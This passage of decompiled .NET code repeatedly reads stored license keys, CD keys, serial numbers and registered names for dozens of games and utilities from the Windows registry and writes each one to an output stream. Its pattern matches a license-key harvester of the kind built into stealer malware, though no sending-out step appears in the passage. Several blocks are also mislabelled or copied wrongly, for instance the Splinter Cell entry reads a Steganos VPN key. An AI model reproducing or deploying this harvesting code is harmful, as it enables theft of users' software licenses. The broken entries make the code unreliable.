					streamWriter.Flush();
					goto IL_40a8;
					IL_40a8:
					ProjectData.ClearProjectError();
					num3 = -141;
					goto IL_40b4;
					IL_40b4:
					num = 976;
					streamWriter.WriteLine("PowerDvD");
					goto IL_40c7;
					IL_40c7:
					num = 977;
					value140 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\CyberLink\\PowerDVD", "UI_RMK", null));
					goto IL_40e5;
					IL_40e5:
					num = 978;
					streamWriter.WriteLine(value140);
					goto IL_40f5;
					IL_40f5:
					num = 979;
					streamWriter.Flush();
					goto IL_4103;
					IL_4103:
					num = 980;
					streamWriter.WriteLine("");
					goto IL_4116;
					IL_4116:
					num = 981;
					streamWriter.Flush();
					goto IL_4124;
					IL_4124:
					ProjectData.ClearProjectError();
					num3 = -142;
					goto IL_4130;
					IL_4130:
					num = 983;
					streamWriter.WriteLine("PowerStrip");
					goto IL_4143;
					IL_4143:
					num = 984;
					value141 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\EnTech\\PowerStrip", "Key", null));
					goto IL_4161;
					IL_4161:
					num = 985;
					streamWriter.WriteLine(value141);
					goto IL_4171;
					IL_4171:
					num = 986;
					streamWriter.Flush();
					goto IL_417f;
					IL_417f:
					num = 987;
					streamWriter.WriteLine("");
					goto IL_4192;
					IL_4192:
					num = 988;
					streamWriter.Flush();
					goto IL_41a0;
					IL_41a0:
					ProjectData.ClearProjectError();
					num3 = -143;
					goto IL_41ac;
					IL_41ac:
					num = 990;
					streamWriter.WriteLine("Pro Evolution Soccer 2008");
					goto IL_41bf;
					IL_41bf:
					num = 991;
					value142 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\KONAMI\\PES2008", "code", null));
					goto IL_41dd;
					IL_41dd:
					num = 992;
					streamWriter.WriteLine(value142);
					goto IL_41ed;
					IL_41ed:
					num = 993;
					streamWriter.Flush();
					goto IL_41fb;
					IL_41fb:
					num = 994;
					streamWriter.WriteLine("");
					goto IL_420e;
					IL_420e:
					num = 995;
					streamWriter.Flush();
					goto IL_421c;
					IL_421c:
					ProjectData.ClearProjectError();
					num3 = -144;
					goto IL_4228;
					IL_4228:
					num = 997;
					streamWriter.WriteLine("Rainbow Six III RavenShield");
					goto IL_423b;
					IL_423b:
					num = 998;
					value143 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Red Storm Entertainment\\RAVENSHIELD", "CDKey", null));
					goto IL_4259;
					IL_4259:
					num = 999;
					streamWriter.WriteLine(value143);
					goto IL_4269;
					IL_4269:
					num = 1000;
					streamWriter.Flush();
					goto IL_4277;
					IL_4277:
					num = 1001;
					streamWriter.WriteLine("");
					goto IL_428a;
					IL_428a:
					num = 1002;
					streamWriter.Flush();
					goto IL_4298;
					IL_4298:
					ProjectData.ClearProjectError();
					num3 = -145;
					goto IL_42a4;
					IL_42a4:
					num = 1004;
					streamWriter.WriteLine("Shogun Total War Warlord Edition");
					goto IL_42b7;
					IL_42b7:
					num = 1005;
					value144 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition", "ergc", null));
					goto IL_42d5;
					IL_42d5:
					num = 1006;
					streamWriter.WriteLine(value144);
					goto IL_42e5;
					IL_42e5:
					num = 1007;
					streamWriter.Flush();
					goto IL_42f3;
					IL_42f3:
					num = 1008;
					streamWriter.WriteLine("");
					goto IL_4306;
					IL_4306:
					num = 1009;
					streamWriter.Flush();
					goto IL_4314;
					IL_4314:
					ProjectData.ClearProjectError();
					num3 = -146;
					goto IL_4320;
					IL_4320:
					num = 1011;
					streamWriter.WriteLine("Sid(Meier) 's Pirates!");
					goto IL_4333;
					IL_4333:
					num = 1012;
					value145 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Atari\\Sid Meier's Pirates!", "CDKey", null));
					goto IL_4351;
					IL_4351:
					num = 1013;
					streamWriter.WriteLine(value145);
					goto IL_4361;
					IL_4361:
					num = 1014;
					streamWriter.Flush();
					goto IL_436f;
					IL_436f:
					num = 1015;
					streamWriter.WriteLine("");
					goto IL_4382;
					IL_4382:
					num = 1016;
					streamWriter.Flush();
					goto IL_4390;
					IL_4390:
					ProjectData.ClearProjectError();
					num3 = -147;
					goto IL_439c;
					IL_439c:
					num = 1018;
					streamWriter.WriteLine("Sid(Meier) 's Pirates!");
					goto IL_43af;
					IL_43af:
					num = 1019;
					value146 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Ubisoft\\SILENT HUNTER III\\Keys", "DiscKey_SH3", null));
					goto IL_43cd;
					IL_43cd:
					num = 1020;
					streamWriter.WriteLine(value146);
					goto IL_43dd;
					IL_43dd:
					num = 1021;
					streamWriter.Flush();
					goto IL_43eb;
					IL_43eb:
					num = 1022;
					streamWriter.WriteLine("");
					goto IL_43fe;
					IL_43fe:
					num = 1023;
					streamWriter.Flush();
					goto IL_440c;
					IL_440c:
					ProjectData.ClearProjectError();
					num3 = -148;
					goto IL_4418;
					IL_4418:
					num = 1025;
					streamWriter.WriteLine("Sim City 4 Deluxe");
					goto IL_442b;
					IL_442b:
					num = 1026;
					value147 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4 Deluxe", "ergc", null));
					goto IL_4449;
					IL_4449:
					num = 1027;
					streamWriter.WriteLine(value147);
					goto IL_4459;
					IL_4459:
					num = 1028;
					streamWriter.Flush();
					goto IL_4467;
					IL_4467:
					num = 1029;
					streamWriter.WriteLine("");
					goto IL_447a;
					IL_447a:
					num = 1030;
					streamWriter.Flush();
					goto IL_4488;
					IL_4488:
					ProjectData.ClearProjectError();
					num3 = -149;
					goto IL_4494;
					IL_4494:
					num = 1032;
					streamWriter.WriteLine("Sim City 4");
					goto IL_44a7;
					IL_44a7:
					num = 1033;
					value148 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4", "ergc", null));
					goto IL_44c5;
					IL_44c5:
					num = 1034;
					streamWriter.WriteLine(value148);
					goto IL_44d5;
					IL_44d5:
					num = 1035;
					streamWriter.Flush();
					goto IL_44e3;
					IL_44e3:
					num = 1036;
					streamWriter.WriteLine("");
					goto IL_44f6;
					IL_44f6:
					num = 1037;
					streamWriter.Flush();
					goto IL_4504;
					IL_4504:
					ProjectData.ClearProjectError();
					num3 = -150;
					goto IL_4510;
					IL_4510:
					num = 1039;
					streamWriter.WriteLine("Sniffer Pro 4.5");
					goto IL_4523;
					IL_4523:
					num = 1040;
					value149 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Network Associates, Inc.\\Sniffer Pro\\4.5\\USER", "SerialNumber", null));
					goto IL_4541;
					IL_4541:
					num = 1041;
					streamWriter.WriteLine(value149);
					goto IL_4551;
					IL_4551:
					num = 1042;
					streamWriter.Flush();
					goto IL_455f;
					IL_455f:
					num = 1043;
					streamWriter.WriteLine("");
					goto IL_4572;
					IL_4572:
					num = 1044;
					streamWriter.Flush();
					goto IL_4580;
					IL_4580:
					ProjectData.ClearProjectError();
					num3 = -151;
					goto IL_458c;
					IL_458c:
					num = 1046;
					streamWriter.WriteLine("Soldiers Of Anarchy");
					goto IL_459f;
					IL_459f:
					num = 1047;
					value150 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_45bd;
					IL_45bd:
					num = 1048;
					streamWriter.WriteLine(value150);
					goto IL_45cd;
					IL_45cd:
					num = 1049;
					streamWriter.Flush();
					goto IL_45db;
					IL_45db:
					num = 1050;
					streamWriter.WriteLine("");
					goto IL_45ee;
					IL_45ee:
					num = 1051;
					streamWriter.Flush();
					goto IL_45fc;
					IL_45fc:
					ProjectData.ClearProjectError();
					num3 = -152;
					goto IL_4608;
					IL_4608:
					num = 1053;
					streamWriter.WriteLine("Soldiers Of Anarchy");
					goto IL_461b;
					IL_461b:
					num = 1054;
					value151 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_4639;
					IL_4639:
					num = 1055;
					streamWriter.WriteLine(value151);
					goto IL_4649;
					IL_4649:
					num = 1056;
					streamWriter.Flush();
					goto IL_4657;
					IL_4657:
					num = 1057;
					streamWriter.WriteLine("");
					goto IL_466a;
					IL_466a:
					num = 1058;
					streamWriter.Flush();
					goto IL_4678;
					IL_4678:
					ProjectData.ClearProjectError();
					num3 = -153;
					goto IL_4684;
					IL_4684:
					num = 1060;
					streamWriter.WriteLine("Stalker - Shadow of Chernobyl");
					goto IL_4697;
					IL_4697:
					num = 1061;
					value152 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\GSC Game World\\STALKER-SHOC", "InstallCDKEY", null));
					goto IL_46b5;
					IL_46b5:
					num = 1062;
					streamWriter.WriteLine(value152);
					goto IL_46c5;
					IL_46c5:
					num = 1063;
					streamWriter.Flush();
					goto IL_46d3;
					IL_46d3:
					num = 1064;
					streamWriter.WriteLine("");
					goto IL_46e6;
					IL_46e6:
					num = 1065;
					streamWriter.Flush();
					goto IL_46f4;
					IL_46f4:
					ProjectData.ClearProjectError();
					num3 = -154;
					goto IL_4700;
					IL_4700:
					num = 1067;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.0)");
					goto IL_4713;
					IL_4713:
					num = 1068;
					value153 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.0", "CD Key", null));
					goto IL_4731;
					IL_4731:
					num = 1069;
					streamWriter.WriteLine(value153);
					goto IL_4741;
					IL_4741:
					num = 1070;
					streamWriter.Flush();
					goto IL_474f;
					IL_474f:
					num = 1071;
					streamWriter.WriteLine("");
					goto IL_4762;
					IL_4762:
					num = 1072;
					streamWriter.Flush();
					goto IL_4770;
					IL_4770:
					ProjectData.ClearProjectError();
					num3 = -155;
					goto IL_477c;
					IL_477c:
					num = 1074;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.1)");
					goto IL_478f;
					IL_478f:
					num = 1075;
					value154 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.1", "CD Key", null));
					goto IL_47ad;
					IL_47ad:
					num = 1076;
					streamWriter.WriteLine(value154);
					goto IL_47bd;
					IL_47bd:
					num = 1077;
					streamWriter.Flush();
					goto IL_47cb;
					IL_47cb:
					num = 1078;
					streamWriter.WriteLine("");
					goto IL_47de;
					IL_47de:
					num = 1079;
					streamWriter.Flush();
					goto IL_47ec;
					IL_47ec:
					ProjectData.ClearProjectError();
					num3 = -156;
					goto IL_47f8;
					IL_47f8:
					num = 1081;
					streamWriter.WriteLine("Steganos Internet Anonym VPN");
					goto IL_480b;
					IL_480b:
					num = 1082;
					value155 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_4829;
					IL_4829:
					num = 1083;
					streamWriter.WriteLine(value155);
					goto IL_4839;
					IL_4839:
					num = 1084;
					streamWriter.Flush();
					goto IL_4847;
					IL_4847:
					num = 1085;
					streamWriter.WriteLine("");
					goto IL_485a;
					IL_485a:
					num = 1086;
					streamWriter.Flush();
					goto IL_4868;
					IL_4868:
					ProjectData.ClearProjectError();
					num3 = -157;
					goto IL_4874;
					IL_4874:
					num = 1088;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow");
					goto IL_4887;
					IL_4887:
					num = 1089;
					value156 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_48a5;
					IL_48a5:
					num = 1090;
					streamWriter.WriteLine(value156);
					goto IL_48b5;
					IL_48b5:
					num = 1091;
					streamWriter.Flush();
					goto IL_48c3;
					IL_48c3:
					num = 1092;
					streamWriter.WriteLine("");
					goto IL_48d6;
					IL_48d6:
					num = 1093;
					streamWriter.Flush();
					goto IL_48e4;
					IL_48e4:
					ProjectData.ClearProjectError();
					num3 = -158;
					goto IL_48f0;
					IL_48f0:
					num = 1095;
					streamWriter.WriteLine("Surpreme Commander");
					goto IL_4903;
					IL_4903:
					num = 1096;
					value157 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\THQ\\Gas Powered Games\\Supreme Commander", "KEY", null));
					goto IL_4921;
					IL_4921:
					num = 1097;
					streamWriter.WriteLine(value157);
					goto IL_4931;
					IL_4931:
					num = 1098;
					streamWriter.Flush();
					goto IL_493f;
					IL_493f:
					num = 1099;
					streamWriter.WriteLine("");
					goto IL_4952;
					IL_4952:
					num = 1100;
					streamWriter.Flush();
					goto IL_4960;
					IL_4960:
					ProjectData.ClearProjectError();
					num3 = -159;
					goto IL_496c;
					IL_496c:
					num = 1102;
					streamWriter.WriteLine("S.W.A.T 2");
					goto IL_497f;
					IL_497f:
					num = 1103;
					value158 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat2", null));
					goto IL_499d;
					IL_499d:
					num = 1104;
					streamWriter.WriteLine(value158);
					goto IL_49ad;
					IL_49ad:
					num = 1105;
					streamWriter.Flush();
					goto IL_49bb;
					IL_49bb:
					num = 1106;
					streamWriter.WriteLine("");
					goto IL_49ce;
					IL_49ce:
					num = 1107;
					streamWriter.Flush();
					goto IL_49dc;
					IL_49dc:
					ProjectData.ClearProjectError();
					num3 = -160;
					goto IL_49e8;
					IL_49e8:
					num = 1109;
					streamWriter.WriteLine("S.W.A.T 3");
					goto IL_49fb;
					IL_49fb:
					num = 1110;
					value159 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat3", null));
					goto IL_4a19;
					IL_4a19:
					num = 1111;
					streamWriter.WriteLine(value159);
					goto IL_4a29;
					IL_4a29:
					num = 1112;
					streamWriter.Flush();
					goto IL_4a37;
					IL_4a37:
					num = 1113;
					streamWriter.WriteLine("");
					goto IL_4a4a;
					IL_4a4a:
					num = 1114;
					streamWriter.Flush();
					goto IL_4a58;
					IL_4a58:
					ProjectData.ClearProjectError();
					num3 = -161;
					goto IL_4a64;
					IL_4a64:
					num = 1116;
					streamWriter.WriteLine("S.W.A.T 4");
					goto IL_4a77;
					IL_4a77:
					num = 1117;
					value160 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat4", null));
					goto IL_4a95;
					IL_4a95:
					num = 1118;
					streamWriter.WriteLine(value160);
					goto IL_4aa5;
					IL_4aa5:
					num = 1119;
					streamWriter.Flush();
					goto IL_4ab3;
					IL_4ab3:
					num = 1120;
					streamWriter.WriteLine("");
					goto IL_4ac6;
					IL_4ac6:
					num = 1121;
					streamWriter.Flush();
					goto IL_4ad4;
					IL_4ad4:
					ProjectData.ClearProjectError();
					num3 = -162;
					goto IL_4ae0;
					IL_4ae0:
					num = 1123;
					streamWriter.WriteLine("TechSmith SnagIt (Name)");
					goto IL_4af3;
					IL_4af3:
					num = 1124;
					value161 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegisteredTo", null));
					goto IL_4b11;
					IL_4b11:
					num = 1125;
					streamWriter.WriteLine(value161);
					goto IL_4b21;
					IL_4b21:
					num = 1126;
					streamWriter.Flush();
					goto IL_4b2f;
					IL_4b2f:
					num = 1127;
					streamWriter.WriteLine("");
					goto IL_4b42;
					IL_4b42:
					num = 1128;
					streamWriter.Flush();
					goto IL_4b50;
					IL_4b50:
					ProjectData.ClearProjectError();
					num3 = -163;
					goto IL_4b5c;
					IL_4b5c:
					num = 1130;
					streamWriter.WriteLine("TechSmith SnagIt (Name)");
					goto IL_4b6f;
					IL_4b6f:
					num = 1131;
					value162 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_4b8d;
					IL_4b8d:
					num = 1132;
					streamWriter.WriteLine(value162);
					goto IL_4b9d;
					IL_4b9d:
					num = 1133;
					streamWriter.Flush();
					goto IL_4bab;
					IL_4bab:
					num = 1134;
					streamWriter.WriteLine("");
					goto IL_4bbe;
					IL_4bbe:
					num = 1135;
					streamWriter.Flush();
					goto IL_4bcc;
					IL_4bcc:
					ProjectData.ClearProjectError();
					num3 = -164;
					goto IL_4bd8;
					IL_4bd8:
					num = 1137;
					streamWriter.WriteLine("TechSmith SnagIt (Serial)");
					goto IL_4beb;
					IL_4beb:
					num = 1138;
					value163 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_4c09;
					IL_4c09:
					num = 1139;
					streamWriter.WriteLine(value163);
					goto IL_4c19;
					IL_4c19:
					num = 1140;
					streamWriter.Flush();
					goto IL_4c27;
					IL_4c27:
					num = 1141;
					streamWriter.WriteLine("");
					goto IL_4c3a;
					IL_4c3a:
					num = 1142;
					streamWriter.Flush();
					goto IL_4c48;
					IL_4c48:
					ProjectData.ClearProjectError();
					num3 = -165;
					goto IL_4c54;
					IL_4c54:
					num = 1144;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner)");
					goto IL_4c67;
					IL_4c67:
					num = 1145;
					value164 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Owner Name", null));
					goto IL_4c85;
					IL_4c85:
					num = 1146;
					streamWriter.WriteLine(value164);
					goto IL_4c95;
					IL_4c95:
					num = 1147;
					streamWriter.Flush();
					goto IL_4ca3;
					IL_4ca3:
					num = 1148;
					streamWriter.WriteLine("");
					goto IL_4cb6;
					IL_4cb6:
					num = 1149;
					streamWriter.Flush();
					goto IL_4cc4;
					IL_4cc4:
					ProjectData.ClearProjectError();
					num3 = -166;
					goto IL_4cd0;
					IL_4cd0:
					num = 1151;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner)");
					goto IL_4ce3;
					IL_4ce3:
					num = 1152;
					value165 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Registration Key", null));
					goto IL_4d01;
					IL_4d01:
					num = 1153;
					streamWriter.WriteLine(value165);
					goto IL_4d11;
					IL_4d11:
					num = 1154;
					streamWriter.Flush();
					goto IL_4d1f;
					IL_4d1f:
					num = 1155;
					streamWriter.WriteLine("");
					goto IL_4d32;
					IL_4d32:
					num = 1156;
					streamWriter.Flush();
					goto IL_4d40;
					IL_4d40:
					ProjectData.ClearProjectError();
					num3 = -167;
					goto IL_4d4c;
					IL_4d4c:
					num = 1158;
					streamWriter.WriteLine("The Battle for Middle-earth");
					goto IL_4d5f;
					IL_4d5f:
					num = 1159;
					value166 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Battle for Middle-earth", "ergc", null));
					goto IL_4d7d;
					IL_4d7d:
					num = 1160;
					streamWriter.WriteLine(value166);
					goto IL_4d8d;
					IL_4d8d:
					num = 1161;
					streamWriter.Flush();
					goto IL_4d9b;
					IL_4d9b:
					num = 1162;
					streamWriter.WriteLine("");
					goto IL_4dae;
					IL_4dae:
					num = 1163;
					streamWriter.Flush();
					goto IL_4dbc;
					IL_4dbc:
					ProjectData.ClearProjectError();
					num3 = -168;
					goto IL_4dc8;
					IL_4dc8:
					num = 1165;
					streamWriter.WriteLine("The Orange Box");
					goto IL_4ddb;
					IL_4ddb:
					num = 1166;
					value167 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Orange Box", "ergc", null));
					goto IL_4df9;
					IL_4df9:
					num = 1167;
					streamWriter.WriteLine(value167);
					goto IL_4e09;
					IL_4e09:
					num = 1168;
					streamWriter.Flush();
					goto IL_4e17;
					IL_4e17:
					num = 1169;
					streamWriter.WriteLine("");
					goto IL_4e2a;
					IL_4e2a:
					num = 1170;
					streamWriter.Flush();
					goto IL_4e38;
					IL_4e38:
					ProjectData.ClearProjectError();
					num3 = -169;
					goto IL_4e44;
					IL_4e44:
					num = 1172;
					streamWriter.WriteLine("The Orange Box");
					goto IL_4e57;
					IL_4e57:
					num = 1173;
					value168 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "Timeshift", null));
					goto IL_4e75;
					IL_4e75:
					num = 1174;
					streamWriter.WriteLine(value168);
					goto IL_4e85;
					IL_4e85:
					num = 1175;
					streamWriter.Flush();
					goto IL_4e93;
					IL_4e93:
					num = 1176;
					streamWriter.WriteLine("");
					goto IL_4ea6;
					IL_4ea6:
					num = 1177;
					streamWriter.Flush();
					goto IL_4eb4;
					IL_4eb4:
					ProjectData.ClearProjectError();
					num3 = -170;
					goto IL_4ec0;
					IL_4ec0:
					num = 1179;
					streamWriter.WriteLine("TMPGEnc DVD Author");
					goto IL_4ed3;
					IL_4ed3:
					num = 1180;
					value169 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Pegasys Inc.\\TMPGEnc DVD Author\\1.0", "RegistrationCode", null));
					goto IL_4ef1;
					IL_4ef1:
					num = 1181;
					streamWriter.WriteLine(value169);
					goto IL_4f01;
					IL_4f01:
					num = 1182;
					streamWriter.Flush();
					goto IL_4f0f;
					IL_4f0f:
					num = 1183;
					streamWriter.WriteLine("");
					goto IL_4f22;
					IL_4f22:
					num = 1184;
					streamWriter.Flush();
					goto IL_4f30;
					IL_4f30:
					ProjectData.ClearProjectError();
					num3 = -171;
					goto IL_4f3c;
					IL_4f3c:
					num = 1186;
					streamWriter.WriteLine("TuneUp 2007 (Name)");
					goto IL_4f4f;
					IL_4f4f:
					num = 1187;
					value170 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "UserName", null));
					goto IL_4f6d;
					IL_4f6d:
					num = 1188;
					streamWriter.WriteLine(value170);
					goto IL_4f7d;
					IL_4f7d:
					num = 1189;
					streamWriter.Flush();
					goto IL_4f8b;
					IL_4f8b:
					num = 1190;
					streamWriter.WriteLine("");
					goto IL_4f9e;
					IL_4f9e:
					num = 1191;
					streamWriter.Flush();
					goto IL_4fac;
					IL_4fac:
					ProjectData.ClearProjectError();
					num3 = -172;
					goto IL_4fb8;
					IL_4fb8:
					num = 1193;
					streamWriter.WriteLine("TuneUp 2007 (Key)");
					goto IL_4fcb;
					IL_4fcb:
					num = 1194;
					value171 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "RegCode", null));
					goto IL_4fe9;
					IL_4fe9:
					num = 1195;
					streamWriter.WriteLine(value171);
					goto IL_4ff9;
					IL_4ff9:
					num = 1196;
					streamWriter.Flush();
					goto IL_5007;
					IL_5007:
					num = 1197;
					streamWriter.WriteLine("");
					goto IL_501a;
					IL_501a:
					num = 1198;
					streamWriter.Flush();
					goto IL_5028;
					IL_5028:
					ProjectData.ClearProjectError();
					num3 = -173;
					goto IL_5034;
					IL_5034:
					num = 1200;
					streamWriter.WriteLine("TuneUp 2007 (Company)");
					goto IL_5047;
					IL_5047:
					num = 1201;
					value172 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "Company", null));
					goto IL_5065;
					IL_5065:
					num = 1202;
					streamWriter.WriteLine(value172);
					goto IL_5075;
					IL_5075:
					num = 1203;
					streamWriter.Flush();
					goto IL_5083;
					IL_5083:
					num = 1204;
					streamWriter.WriteLine("");
					goto IL_5096;
					IL_5096:
					num = 1205;
					streamWriter.Flush();
					goto IL_50a4;
					IL_50a4:
					ProjectData.ClearProjectError();
					num3 = -174;
					goto IL_50b0;
					IL_50b0:
					num = 1207;
					streamWriter.WriteLine("TuneUp 2008 (Name)");
					goto IL_50c3;
					IL_50c3:
					num = 1208;
					value173 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "UserName", null));
					goto IL_50e1;
					IL_50e1:
					num = 1209;
					streamWriter.WriteLine(value173);
					goto IL_50f1;
					IL_50f1:
					num = 1210;
					streamWriter.Flush();
					goto IL_50ff;
					IL_50ff:
					num = 1211;
					streamWriter.WriteLine("");
					goto IL_5112;
					IL_5112:
					num = 1212;
					streamWriter.Flush();
					goto IL_5120;
					IL_5120:
					ProjectData.ClearProjectError();
					num3 = -175;
					goto IL_512c;
					IL_512c:
					num = 1214;
					streamWriter.WriteLine("TuneUp 2008 (Key)");
					goto IL_513f;
					IL_513f:
					num = 1215;
					value174 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "RegCode", null));
					goto IL_515d;
					IL_515d:
					num = 1216;
					streamWriter.WriteLine(value174);
					goto IL_516d;
					IL_516d:
					num = 1217;
					streamWriter.Flush();
					goto IL_517b;
					IL_517b:
					num = 1218;
					streamWriter.WriteLine("");
					goto IL_518e;
					IL_518e:
					num = 1219;
					streamWriter.Flush();
					goto IL_519c;
					IL_519c:
					ProjectData.ClearProjectError();
					num3 = -176;
					goto IL_51a8;
					IL_51a8:
					num = 1221;
					streamWriter.WriteLine("TuneUp 2008 (Company)");
					goto IL_51bb;
					IL_51bb:
					num = 1222;
					value175 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "Company", null));
					goto IL_51d9;
					IL_51d9:
					num = 1223;
					streamWriter.WriteLine(value175);
					goto IL_51e9;
					IL_51e9:
					num = 1224;
					streamWriter.Flush();
					goto IL_51f7;
					IL_51f7:
					num = 1225;
					streamWriter.WriteLine("");
					goto IL_520a;
					IL_520a:
					num = 1226;
					streamWriter.Flush();
					goto IL_5218;
					IL_5218:
					ProjectData.ClearProjectError();
					num3 = -177;
					goto IL_5224;
					IL_5224:
					num = 1228;
					streamWriter.WriteLine("TuneUp 2009 (Name)");
					goto IL_5237;
					IL_5237:
					num = 1229;
					value176 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "UserName", null));
					goto IL_5255;
					IL_5255:
					num = 1230;
					streamWriter.WriteLine(value176);
					goto IL_5265;
					IL_5265:
					num = 1231;
					streamWriter.Flush();
					goto IL_5273;
					IL_5273:
					num = 1232;
					streamWriter.WriteLine("");
					goto IL_5286;
					IL_5286:
					num = 1233;
					streamWriter.Flush();
					goto IL_5294;
					IL_5294:
					ProjectData.ClearProjectError();
					num3 = -178;
					goto IL_52a0;
					IL_52a0:
					num = 1235;
					streamWriter.WriteLine("TuneUp 2009 (Key)");
					goto IL_52b3;
					IL_52b3:
					num = 1236;
					value177 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "ProductKey", null));
					goto IL_52d1;
					IL_52d1:
					num = 1237;
					streamWriter.WriteLine(value177);
					goto IL_52e1;
					IL_52e1:
					num = 1238;
					streamWriter.Flush();
					goto IL_52ef;
					IL_52ef:
					num = 1239;
					streamWriter.WriteLine("");
					goto IL_5302;
					IL_5302:
					num = 1240;
					streamWriter.Flush();
					goto IL_5310;
					IL_5310:
					ProjectData.ClearProjectError();
					num3 = -179;
					goto IL_531c;
					IL_531c:
					num = 1242;
					streamWriter.WriteLine("TuneUp 2009 (Company)");
					goto IL_532f;
					IL_532f:
					num = 1243;
					value178 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "Company", null));
					goto IL_534d;
					IL_534d:
					num = 1244;
					streamWriter.WriteLine(value178);
					goto IL_535d;
					IL_535d:
					num = 1245;
					streamWriter.Flush();
					goto IL_536b;
					IL_536b:
					num = 1246;
					streamWriter.WriteLine("");
					goto IL_537e;
					IL_537e:
					num = 1247;
					streamWriter.Flush();
					goto IL_538c;
					IL_538c:
					ProjectData.ClearProjectError();
					num3 = -180;
					goto IL_5398;
					IL_5398:
					num = 1249;
					streamWriter.WriteLine("Winamp (Username)");
					goto IL_53ab;
					IL_53ab:
					num = 1250;
					value179 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regname", null));
					goto IL_53c9;
					IL_53c9:
					num = 1251;
					streamWriter.WriteLine(value179);
					goto IL_53d9;
					IL_53d9:
					num = 1252;
					streamWriter.Flush();
					goto IL_53e7;
					IL_53e7:
					num = 1253;
					streamWriter.WriteLine("");
					goto IL_53fa;
					IL_53fa:
					num = 1254;
					streamWriter.Flush();
					goto IL_5408;
					IL_5408:
					ProjectData.ClearProjectError();
					num3 = -181;
					goto IL_5414;
					IL_5414:
					num = 1256;
					streamWriter.WriteLine("Winamp (Serial)");
					goto IL_5427;
					IL_5427:
					num = 1257;
					value180 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regkey", null));
					goto IL_5445;
					IL_5445:
					num = 1258;
					streamWriter.WriteLine(value180);
					goto IL_5455;
					IL_5455:
					num = 1259;
					streamWriter.Flush();
					goto IL_5463;
					IL_5463:
					num = 1260;
					streamWriter.WriteLine("");
					goto IL_5476;
					IL_5476:
					num = 1261;
					streamWriter.Flush();
					goto IL_5484;
					IL_5484:
					num = 1262;
					streamWriter.Flush();
					goto IL_5492;
					IL_5492:
					num = 1263;
